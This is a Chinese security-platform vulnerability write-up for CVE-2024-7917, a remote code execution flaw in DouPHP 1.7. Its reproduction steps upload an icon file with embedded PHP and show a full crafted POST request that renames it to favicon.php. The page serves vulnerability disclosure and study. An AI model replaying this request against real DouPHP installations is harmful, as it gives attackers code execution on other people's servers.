
# 安全团队贡献平台

导航切换

* [首页](/)
* 所有信息
  + [所有情报](/list/all/)
  + [推荐专区](/list/recommend/)
  + [综合情报](/list/wiki/)
  + [用户提交](/list/userpost/)
  + [高校情报](/list/school/)
* [排行榜](/user/)
* [礼品中心](/gift/)
* [搜索](/search/)
* [公告](/announcements/)
* [IPwhois新功能](/ip/)
* [WooYun drops新功能](/wooyun/)
* 更多
  + [edudata平台](https://wiki.shikangsi.com/cas/jump/edudata)
  + [零组知识库-006应急响应目录](https://wiki.shikangsi.com/post/3629/)
  + [零组知识库-007内网渗透目录](https://wiki.shikangsi.com/post/3631/)
  + [零组知识库-009安全技术目录](https://wiki.shikangsi.com/post/3632/)
  + [零组知识库-010域渗透目录](https://wiki.shikangsi.com/post/3633/)
  + [零组知识库-011运维与二进制安全目录](https://wiki.shikangsi.com/post/3634/)
  + [XSS平台](https://wiki.shikangsi.com/cas/jump/xss)
  + [edusrc数据分析](http://data.shikangsi.com/)
  + [友情链接](https://wiki.shikangsi.com/links/)
  + [wiki社区](https://wiki.shikangsi.com/zone/)

[提交贡献](/add/)

[登录](/login/)

[注册](/register/)

# 【原创】（CVE-2024-7917）DouPHP 1.7 Release 20220822 远程代码执行漏洞

---

分享
### 当前为私密分享，无需登录即可查看。

---

| 时间 | 作者 | 可见性 | 等级 | Rank |
| --- | --- | --- | --- | --- |
|| 2024-08-12 14:22:58 | [Hkey](/profile/637/) | 公开的 | 高危 | 3 |
| --- | --- | --- | --- | --- |

CVE-2024-7917
Created: 08/18/2024 10:37 AM
Changes: 08/18/2024 10:37 AM (55)
Submitter: Hkey@Wiki

---

# 漏洞描述

> DouPHP是一个开源的PHP开发框架，广泛应用于快速开发Web应用。其设计目标是简单、快速、灵活、安全。

DouPHP 1.7\_Release\_20220822版本中存在一个远程代码执行（RCE）漏洞。拥有管理员权限的攻击者可以通过该漏洞在服务器上执行任意命令。漏洞通过上传恶意文件、修改文件扩展名以及通过构造特定的数据包来执行PHP代码。

# 漏洞复现

1、 登录管理员后台。

2、 上传恶意文件

![null](/media/images/2024/08/12/8449c8a3-7fa1-4968-8cb6-c49ec4d41a5c-z4wy94sz.png)

![null](/media/images/2024/08/12/722b0d55-5152-4e46-8afa-ae3158f766c0-yMVQ8qJu.png)

3、 上传一个包含php代码的ico图标

![null](/media/images/2024/08/12/8193f54e-2371-4f0e-b97d-96b226bc84a9-npHvH8Xp.png)

上传成功:

![null](/media/images/2024/08/12/1ba8de15-2cd7-493b-a020-bc2c174b518e-yynuDYfV.png)

4、把上传的favicon.ico文件修改为favicon.php,从而执行php代码。

![null](/media/images/2024/08/12/c71b679e-4025-4ec9-b3bc-4d51e8bc6c3b-MqTsGmEA.png)

![null](/media/images/2024/08/12/e6044073-cbac-4ab9-8c2c-cfe15eb30384-S43xmy1D.png)

![null](/media/images/2024/08/12/3161dbaf-4918-4c4a-bf75-aa7bb9284756-PV3dvLko.png)

抓取数据包，进行修改文件名操作

![null](/media/images/2024/08/12/3ab6622d-61bd-4d4b-b771-44a609f05afb-McymJelb.png)

```
POST /cache/custom\_admin\_path.candel.php HTTP/1.1
Host: douphp:84
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,\*/\*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 109
Origin: http://douphp:84
Connection: close
Referer: http://douphp:84/admin/tool.php?rec=custom\_admin\_path
Cookie: PHPSESSID=bl1s095coldq9mc4a2d9ivrgki
Upgrade-Insecure-Requests: 1
Priority: u=0, i

new\_path=favicon.php&old\_path=favicon.ico&ryjwoi=278144&root\_url=http%3A%2F%2Fdouphp%3A84%2F&submit=%E6%8F%90%E4%BA%A4

```

![null](/media/images/2024/08/12/b5c2b172-4f85-4ccb-8704-45c827a69e3c-1Ym4fFYu.png)

访问对应的恶意文件路径:http://{你的url地址}/favicon.php

![null](/media/images/2024/08/12/f23217b3-4b0b-457f-981b-0241de3fd881-1wPJrGiO.png)

attachment/2024/08/d773107c-726b-4f24-a0b7-4aff6cf98e48-weAxeCnx.docx

---

审核评价： 没有任何评价...

2014-2022 © 联系邮箱：admin@sg95.cn    [鄂ICP备15020128号-4](https://beian.miit.gov.cn)

